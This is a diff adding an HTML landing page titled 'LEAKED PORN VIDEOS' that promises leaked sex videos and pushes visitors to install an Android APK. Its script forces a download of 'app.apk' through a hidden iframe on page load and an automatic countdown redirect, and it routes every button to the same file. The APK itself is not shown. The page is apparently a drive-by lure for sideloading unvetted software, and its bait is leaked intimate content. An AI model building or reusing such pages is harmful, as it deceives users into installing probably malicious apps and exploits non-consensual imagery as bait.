@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LEAKED PORN VIDEOS</title>
+    <style>
+        html {
+            /* Mobile viewport optimization */
+            height: -webkit-fill-available;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            /* Fixes mobile browser UI cutoff */
+            font-family: system-ui, sans-serif;
+            background: #000;
+            color: white;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .bg-video {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100vw;
+            height: 100vh;
+            z-index: 0;
+            object-fit: contain;
+            /* Shows full video without stretching or cropping */
+            opacity: 1;
+            /* Fully visible, no blur or darkening effect */
+            pointer-events: none;
+        }
+
+        .hearts {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .heart {
+            position: absolute;
+            font-size: 1.4rem;
+            color: rgba(255, 105, 180, 0.7);
+            animation: rise linear forwards;
+        }
+
+        @keyframes rise {
+            0% {
+                transform: translateY(100vh) scale(0.6) rotate(0deg);
+                opacity: 0.2;
+            }
+
+            20% {
+                opacity: 0.9;
+            }
+
+            100% {
+                transform: translateY(-15vh) scale(1.4) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .static-emojis div {
+            position: absolute;
+            font-size: 3.5rem;
+            opacity: 0.7;
+            z-index: 2;
+            /* Above video, below card */
+            pointer-events: none;
+            filter: drop-shadow(0 0 15px rgba(255, 105, 180, 0.6));
+            animation: float 5s ease-in-out infinite;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0) rotate(-5deg);
+            }
+
+            50% {
+                transform: translateY(-20px) rotate(5deg);
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .header {
+            margin: 30px 0 40px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .logo {
+            width: 54px;
+            height: 54px;
+            background: linear-gradient(135deg, #ff6ec7, #7873f5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.5);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .status {
+            background: rgba(255, 105, 180, 0.15);
+            color: #ff69b4;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+        }
+
+        .subtitle {
+            font-size: 22px;
+            font-weight: 800;
+            color: #ffcc00;
+            /* Highlight color */
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background: rgba(30, 10, 50, 0.65);
+            border: 1px solid rgba(255, 105, 180, 0.25);
+            border-radius: 20px;
+            padding: 30px 24px;
+            width: 100%;
+            max-width: 380px;
+            /* Removed backdrop-filter so the video stays perfectly clear behind the card */
+            margin: 20px 0;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            margin: 12px 0;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            background: linear-gradient(90deg, #ff6ec7, #d4418e);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(255, 105, 180, 0.4);
+            transition: all 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 105, 180, 0.55);
+        }
+
+        .btn-telegram {
+            background: linear-gradient(90deg, #ff6ec7, #c75fff);
+            font-size: 20px;
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .countdown-zone {
+            margin: 40px 0 30px;
+        }
+
+        .redirecting {
+            font-size: 18px;
+            opacity: 0.85;
+            margin-bottom: 12px;
+        }
+
+        .count {
+            font-size: 72px;
+            font-weight: 800;
+            color: #ff69b4;
+            text-shadow: 0 0 30px rgba(255, 105, 180, 0.7);
+        }
+
+        .bottom-btn {
+            margin-top: 40px;
+            font-size: 20px;
+            padding: 20px 40px;
+            background: linear-gradient(90deg, #ff69b4, #ff1493);
+            border-radius: 999px;
+            box-shadow: 0 10px 40px rgba(255, 20, 147, 0.5);
+        }
+
+        @media (max-width:500px) {
+            .count {
+                font-size: 60px;
+            }
+
+            .btn {
+                font-size: 17px;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Background Video -->
+    <video class="bg-video" autoplay loop muted playsinline>
+        <!-- Place a video file named background.mp4 in the folder -->
+        <source src="background.mp4" type="video/mp4">
+    </video>
+
+    <!-- Floating Background Emojis -->
+    <div class="static-emojis">
+        <div style="top: 15%; left: 8%;">💦</div>
+        <div style="top: 25%; right: 12%;">🥵</div>
+        <div style="bottom: 30%; left: 15%;">💋</div>
+        <div style="bottom: 20%; right: 8%;">🍑</div>
+    </div>
+
+    <div class="hearts" id="hearts"></div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">💜</div>
+            <div>
+                <div class="title">LEAKED PORN VIDEOS</div>
+                <div class="status">● Slots Available</div>
+            </div>
+        </div>
+
+        <div class="subtitle">🔥 See Unlimited Leaks 🔥</div>
+
+        <div class="card">
+            <button class="btn" id="startBtn">DOWNLOAD APP NOW</button>
+            <button class="btn" style="background:linear-gradient(90deg,#c75fff,#9b59ff);">ONLY LIMITED ACCESS</button>
+
+            <div style="margin:30px 0; font-size:17px; line-height:1.5;">
+                Watch latest exclusive leaks inside the app 👇
+            </div>
+
+            <div class="countdown-zone">
+                <div class="redirecting">Download starting in</div>
+                <div class="count" id="count">9</div>
+            </div>
+
+            <button class="btn btn-telegram" id="telegramBtn"
+                style="background: linear-gradient(90deg, #10b981, #059669);">
+                🚀 Download APK
+            </button>
+
+            <div style="margin-top:16px; font-size:15px; opacity:0.8;">
+                If download doesn't start, tap Download Now below.
+            </div>
+        </div>
+        <button class="btn bottom-btn" id="bottomBtn">
+            ♥ Download Now →
+        </button>
+    </div>
+
+    <script>
+        // Rising emojis
+        function createHeart() {
+            const h = document.createElement('div');
+            h.className = 'heart';
+            h.innerHTML = ['♥', '🥵', '👄', '💋', '💦', '💕'][Math.floor(Math.random() * 6)];
+            h.style.left = Math.random() * 100 + 'vw';
+            h.style.animationDuration = (Math.random() * 8 + 10) + 's';
+            h.style.fontSize = (Math.random() * 1.2 + 0.9) + 'rem';
+            document.getElementById('hearts').appendChild(h);
+            setTimeout(() => h.remove(), 20000);
+        }
+        setInterval(createHeart, 380);
+
+        // Download App function
+        function goToBot() {
+            // The direct download link to your APK
+            const apkUrl = "app.apk";
+
+            // This method is much more reliable for forcing automatic downloads on mobile browsers
+            window.location.href = apkUrl;
+        }
+
+        // Countdown + auto redirect
+        let sec = 3;
+        const countEl = document.getElementById('count');
+        const timer = setInterval(() => {
+            sec--;
+            countEl.textContent = sec;
+            if (sec <= 0) {
+                clearInterval(timer);
+                countEl.textContent = "0";
+                setTimeout(goToBot, 500);
+            }
+        }, 1000);
+
+        // Force immediate download right as the page fully loads
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                // Using a hidden iframe is the most reliable way to force auto-downloads on mobile browsers
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = "app.apk";
+                document.body.appendChild(iframe);
+            }, 800);
+        });
+
+        // Buttons pe click se bhi redirect
+        document.getElementById('startBtn').onclick = goToBot;
+        document.getElementById('telegramBtn').onclick = goToBot;
+        document.getElementById('bottomBtn').onclick = goToBot;
+    </script>
+
+</body>
+
+</html>
